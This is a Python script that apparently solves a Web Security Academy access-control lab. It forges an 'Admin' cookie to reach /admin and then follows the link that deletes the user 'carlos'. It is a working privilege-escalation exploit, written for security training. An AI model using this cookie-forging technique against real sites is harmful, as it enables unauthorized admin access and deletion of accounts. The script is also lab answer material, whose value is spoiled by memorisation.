from web_security_academy.core.logger import logger
from urllib.parse import urljoin
from bs4 import BeautifulSoup

import re


def solve_lab(session, *args):
    session.login("wiener", "peter")

    # Visiting /admin
    session.cookies.set("Admin", "true")
    logger.info('Set "Admin" cookie to "true"')

    url = urljoin(session.url, "/admin")
    logger.info(f'Visiting "{url}" with the following cookies:')
    logger.info(session.cookies.get_dict())

    resp = session.get(url)
    if resp.status_code != 200:
        logger.failure(f"Unable to visit URL.")
        return
    else:
        logger.success("GET request came back with a successful response.")

    # Deleting user 'carlos'
    logger.info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))
    if tag is None:
        logger.failure("Unable to find URL.")
        return
    else:
        url = urljoin(url, tag.get("href"))
        logger.success(f"Found URL: {url}")

    logger.info("Visiting URL to delete the user carlos...")
    resp = session.get(url)
    if resp.status_code != 200:
        logger.failure(f"GET request unsuccessful.")
    else:
        logger.success("Success.")
